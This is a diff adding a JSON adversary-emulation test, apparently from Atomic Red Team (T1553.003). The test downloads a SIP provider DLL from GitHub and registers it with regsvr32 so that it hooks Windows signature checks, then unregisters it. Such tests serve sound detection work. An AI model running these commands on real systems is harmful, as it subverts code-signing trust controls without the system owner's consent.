@@ -1,0 +1,105 @@
+{
+  "id": "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675",
+  "name": "SIP (Subject Interface Package) Hijacking via Custom DLL",
+  "description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e02d5a83-3fd1-45de-8aaa-7ac010db1d53",
+      "type": "execute-command",
+      "data": {
+        "command": "regsvr32.exe #{dll_payload}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "20a559b6-8086-44c5-8f91-34d72c08bd50",
+      "type": "execute-command",
+      "data": {
+        "command": "regsvr32.exe /u #{dll_payload}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "72526e65-32b4-40e2-8143-98fce9e11719",
+      "name": "Check dependency 1/1",
+      "description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ad740cbf-7a2b-450e-b77f-64044b02702c",
+      "name": "Resolve dependency 1/1",
+      "description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll\" -OutFile \"#{dll_payload}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ed0cd727-061a-4d4c-a512-fe26b95bd7c2",
+      "name": "Re-check dependency 1/1",
+      "description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e02d5a83-3fd1-45de-8aaa-7ac010db1d53",
+      "p": "on-success",
+      "o": "20a559b6-8086-44c5-8f91-34d72c08bd50"
+    },
+    {
+      "s": "e02d5a83-3fd1-45de-8aaa-7ac010db1d53",
+      "p": "on-failure",
+      "o": "20a559b6-8086-44c5-8f91-34d72c08bd50"
+    },
+    {
+      "s": "72526e65-32b4-40e2-8143-98fce9e11719",
+      "p": "on-success",
+      "o": "e02d5a83-3fd1-45de-8aaa-7ac010db1d53"
+    },
+    {
+      "s": "72526e65-32b4-40e2-8143-98fce9e11719",
+      "p": "on-failure",
+      "o": "ad740cbf-7a2b-450e-b77f-64044b02702c"
+    },
+    {
+      "s": "ad740cbf-7a2b-450e-b77f-64044b02702c",
+      "p": "on-success",
+      "o": "ed0cd727-061a-4d4c-a512-fe26b95bd7c2"
+    },
+    {
+      "s": "ed0cd727-061a-4d4c-a512-fe26b95bd7c2",
+      "p": "on-failure",
+      "o": "e02d5a83-3fd1-45de-8aaa-7ac010db1d53"
+    }
+  ],
+  "tags": [
+    "T1553.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "dll_payload",
+      "type": "path",
+      "description": "Path to GTSIPProvider.dll",
+      "value": "PathToAtomicsFolder\\T1553.003\\bin\\GTSIPProvider.dll"
+    }
+  ]
+}
